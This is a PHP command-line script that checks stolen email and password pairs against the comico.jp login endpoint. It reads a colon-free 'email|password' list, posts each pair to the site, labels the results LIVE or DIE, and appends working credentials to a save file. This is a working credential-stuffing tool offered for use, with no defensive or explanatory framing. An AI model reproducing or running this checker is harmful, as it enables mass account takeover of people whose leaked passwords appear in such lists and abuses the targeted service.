<?php
error_reporting(0);

$notice = "Use $argv[0] <filename> (optional): <savefile>
Example:	$argv[0] list.txt
Example#2:	$argv[0] list.txt save_file.txt
Default save file:	Save/default_save-date(sdmy).txt

Format list: 
	delim:	|
	value:	email@domain.com|p455wd
";





	function Savedata($file,$data){
	$file = fopen($file,"a");       
	fputs($file,PHP_EOL.$data);  
	return fclose($file);
	}

include"class_curl.php";

        $curl = new curl();
        $curl->cookies('cookies/'.md5($_SERVER['REMOTE_ADDR']).'.txt');
        $curl->ssl(0, 2);

if(empty($argv[1])){
echo $notice;
echo"\r\n";
exit();
}

if(!file_exists($argv[1])){
echo"File $argv[1] not found!\r\n";
exit();
}
	if($argv[2]){
		$saveto = $argv[2];
	}else{
		$date = date('sdmy');
		$saveto = 'Save/default_save_'.$date.'';
	}


$file = file_get_contents($argv[1]);
$ext = explode("\r\n",$file);

foreach($ext as $num => $val){

	$p = explode('|',$val);
	$email = $p[0];
	$pass = $p[1];

	$url = "https://id.comico.jp/login/login.nhn";
	$data = "loginid=$email&password=$pass&autoLoginChk=Y&nexturl=/";
	if(!$email=='' ||  !$pass==''){
	$get = $curl->get($url);
	if($get){
		$post = $curl->post($url,$data);

		if(preg_match('/login/',$post)){
			$data = "DIE | $email | $pass";
			echo $data."\r\n";
		}else{
			$data = "LIVE | $email | $pass";
			echo $data."\r\n";

			Savedata($saveto,$data);
		}

	}
	}
}





